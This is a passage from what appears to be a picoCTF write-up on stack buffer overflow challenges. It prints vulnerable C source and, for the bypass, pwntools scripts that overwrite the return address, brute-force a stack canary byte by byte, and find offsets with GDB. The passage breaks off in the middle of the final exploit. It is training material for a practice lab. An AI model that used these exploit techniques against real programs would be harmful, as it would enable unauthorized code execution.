</pre></table></code></div></div><p>The functions are almost the same as the previous challenge except the win function now needs 2 arguments with values of 0xCAFEF00D and 0xF00DF00D to leak the flag</p><h2 id="solution-2">Solution<a href="#solution-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">warnings</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="c1"># binary configuration
</span><span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Exploiting {a}:{b}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">b</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
<span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Exploiting {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">binary</span><span class="p">))</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'error'</span>
<span class="c1">## Exploit
</span>
<span class="c1"># configuration
</span><span class="n">eip_offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="k">print</span><span class="p">(</span><span class="s">'  [*] EIP offset is set at {a}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">eip_offset</span><span class="p">))</span>
<span class="n">promptChar</span> <span class="o">=</span> <span class="s">':'</span>

<span class="c1"># start process
</span><span class="n">proc</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="c1"># payload
</span><span class="n">chain</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">eip_offset</span><span class="p">)</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x08049296</span><span class="p">))</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'B'</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xcafef00d</span><span class="p">))</span>
<span class="n">chain</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xf00df00d</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>

<span class="c1"># run the exploit
</span><span class="k">print</span><span class="p">(</span><span class="s">'  [*] Sending payload'</span><span class="p">)</span>
<span class="n">proc</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">promptChar</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
<span class="n">proc</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'  [*] Printing program output'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="n">readall</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">,</span><span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">))</span>
</pre></table></code></div></div><h1 id="buffer-overflow-3">Buffer Overflow 3</h1><h2 id="challenge-3">Challenge<a href="#challenge-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Do you think you can bypass the protection and get the flag?
</pre></table></code></div></div><h2 id="static-code-analysis-2">Static Code Analysis<a href="#static-code-analysis-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;wchar.h&gt;
#include &lt;locale.h&gt;
</span>
<span class="cp">#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4
</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s"</span><span class="p">,</span> <span class="s">"Please create 'flag.txt' in this directory with your"</span><span class="p">,</span>
                    <span class="s">"own debugging flag.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">FLAGSIZE</span><span class="p">,</span><span class="n">f</span><span class="p">);</span> <span class="c1">// size bound read</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">global_canary</span><span class="p">[</span><span class="n">CANARY_SIZE</span><span class="p">];</span>
<span class="kt">void</span> <span class="nf">read_canary</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"canary.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s"</span><span class="p">,</span> <span class="s">"Please create 'canary.txt' in this directory with your"</span><span class="p">,</span>
                    <span class="s">"own debugging canary.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">fread</span><span class="p">(</span><span class="n">global_canary</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span><span class="n">CANARY_SIZE</span><span class="p">,</span><span class="n">f</span><span class="p">);</span>
  <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(){</span>
   <span class="kt">char</span> <span class="n">canary</span><span class="p">[</span><span class="n">CANARY_SIZE</span><span class="p">];</span>
   <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
   <span class="kt">char</span> <span class="n">length</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
   <span class="kt">int</span> <span class="n">count</span><span class="p">;</span>
   <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
   <span class="n">memcpy</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="n">global_canary</span><span class="p">,</span><span class="n">CANARY_SIZE</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s %s"</span><span class="p">,</span><span class="s">"Global Canary: "</span><span class="p">,</span><span class="n">global_canary</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s %s"</span><span class="p">,</span><span class="s">"Canary: "</span><span class="p">,</span><span class="n">canary</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"How Many Bytes will You Write Into the Buffer?</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
   <span class="k">while</span> <span class="p">(</span><span class="n">x</span><span class="o">&lt;</span><span class="n">BUFSIZE</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">length</span><span class="o">+</span><span class="n">x</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">length</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">==</span><span class="sc">'\n'</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
      <span class="n">x</span><span class="o">++</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="n">sscanf</span><span class="p">(</span><span class="n">length</span><span class="p">,</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">count</span><span class="p">);</span>

   <span class="n">printf</span><span class="p">(</span><span class="s">"Input&gt; "</span><span class="p">);</span>
   <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">count</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s %s"</span><span class="p">,</span><span class="s">"Global Canary: "</span><span class="p">,</span><span class="n">global_canary</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"%s %s %s"</span><span class="p">,</span><span class="s">"Canary: "</span><span class="p">,</span><span class="n">canary</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="n">global_canary</span><span class="p">,</span><span class="n">CANARY_SIZE</span><span class="p">))</span> <span class="p">{</span>

      <span class="n">printf</span><span class="p">(</span><span class="s">"***** Stack Smashing Detected ***** : Canary Value Corrupt!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="c1">// crash immediately</span>
      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"Ok... Now Where's the Flag?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  
  <span class="c1">// Set the gid to the effective gid</span>
  <span class="c1">// this prevents /bin/sh from dropping the privileges</span>
  <span class="n">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
  <span class="n">read_canary</span><span class="p">();</span>
  <span class="n">vuln</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This time, the vuln function has a buffer overflow protection called a canary. The goal the the stack canary is to detect stack modification. If the canary if overwritten, the program will fail.</p><p>This means if we want to overwrite EIP, we will have to find the value of the canary and his position in the stack</p><h2 id="solution-3">Solution<a href="#solution-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="finding-canary-offset">Finding canary offset<a href="#finding-canary-offset" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>To find the canary offset, we will send an ever growing payload, until the program crashes with error message <code class="language-plaintext highlighter-rouge">***** Stack Smashing Detected ***** : Canary Value Corrupt!</code></p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'error'</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">pad</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">dummycanary</span> <span class="o">=</span> <span class="s">'D'</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span> <span class="c1">#+ dummycanary
</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">readall</span><span class="p">()</span>
    <span class="k">if</span> <span class="sa">b</span><span class="s">'Smash'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'Offset: ({a})'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
        <span class="k">break</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p>Output:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>64
</pre></table></code></div></div><p>This script returns an offset of 64</p><p>Now that we know where in the stack the canary, we have to find itâ€™s value</p><p>What we will do is build a buffer of 64 chars to reach the canary, then weâ€™ll try every printable characters at every position until the program doesnâ€™t give any errors</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'error'</span>
<span class="n">canary</span> <span class="o">=</span> <span class="s">''</span>
<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span><span class="mi">126</span><span class="p">):</span>
        <span class="n">padding</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">readall</span><span class="p">()</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">'Ok...'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
            <span class="n">canary</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
            <span class="k">break</span>
</pre></table></code></div></div><p>Output:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>1
13
133
1337
</pre></table></code></div></div><p>Now that we have the position and value of the canary, we are ready to find the offset to reach EIP. Weâ€™ll be using GDB for this task:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="nv">$ </span>gdb-peda <span class="nt">-q</span> ./vuln   
Reading symbols from ./vuln...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./vuln<span class="o">)</span>
gdb-peda<span class="nv">$ </span>python print<span class="o">(</span><span class="s1">'A'</span> <span class="k">*</span> 64 + <span class="s1">'1337'</span><span class="o">)</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1337
gdb-peda<span class="nv">$ </span>pattern create 100
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
gdb-peda<span class="nv">$ </span>run
Starting program: /home/h3x/work/ctf/picoctf/bof3/vuln 
warning: Error disabling address space randomization: Operation not permitted
How Many Bytes will You Write Into the Buffer?
<span class="o">&gt;</span> 200
Input&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1337AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
Ok... Now Where<span class="s1">'s the Flag?

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414241 ('</span>ABAA<span class="s1">')
ECX: 0x6c0 
EDX: 0xf7f31d67 --&gt; 0xf330d40a 
ESI: 0x1 
EDI: 0x8049220 (&lt;_start&gt;:       endbr32)
EBP: 0x6e414124 ('</span><span class="nv">$AAn</span><span class="s1">')
ESP: 0xffe6b4f0 ("A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
EIP: 0x41434141 ('</span>AACA<span class="s1">')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41434141
[------------------------------------stack-------------------------------------]
0000| 0xffe6b4f0 ("A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0004| 0xffe6b4f4 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0008| 0xffe6b4f8 ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0012| 0xffe6b4fc ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0016| 0xffe6b500 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0020| 0xffe6b504 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0024| 0xffe6b508 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0028| 0xffe6b50c ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41434141 in ?? ()
gdb-peda$ pattern offset 0x41434141
1094926657 found at offset: 16
</span></pre></table></code></div></div><p>EIP is 16 bytes past the canary</p><p>Now letâ€™s find out the address to jump to</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>info functions
<span class="o">[</span>...]
0x08049330  frame_dummy
0x08049336  win &lt;<span class="nt">---------</span>
0x080493d5  read_canary
0x08049461  vuln
0x08049588  main
0x08049600  __libc_csu_init
<span class="o">[</span>...]
</pre></table></code></div></div><p>With everything in hands, letâ€™s pwn the binary. Hereâ€™s the full exploit script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">warnings</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'ERROR'</span>
<span class="n">warnings</span><span class="p">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s">"ignore"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">bfcanary</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
    <span class="n">canary</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span><span class="mi">126</span><span class="p">):</span>
            <span class="n">padding</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
            <span class="n">proc</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span><span class="mi">58840</span><span class="p">)</span> 
            <span class="n">proc</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">promptChar</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
            <span class="n">proc</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">promptChar</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">readall</span><span class="p">()</span>
            <span class="k">if</span> <span class="sa">b</span><span class="s">'Ok...'</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
                <span class="n">canary</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
                <span class="k">break</span>
            <span class="n">proc</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">canary</span>

